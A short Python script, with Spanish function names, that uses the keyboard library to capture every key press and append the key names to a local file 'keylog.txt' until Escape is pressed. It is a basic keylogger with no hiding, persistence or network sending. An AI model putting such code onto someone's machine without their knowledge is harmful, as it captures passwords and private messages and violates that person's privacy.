import keyboard

def guardar(tecla):
    archivo=open("keylog.txt","a")
    archivo.write(tecla)
    archivo.close()

def presionar (letra):
    guardar(letra.name)

keyboard.on_press(presionar)
keyboard.wait("esc")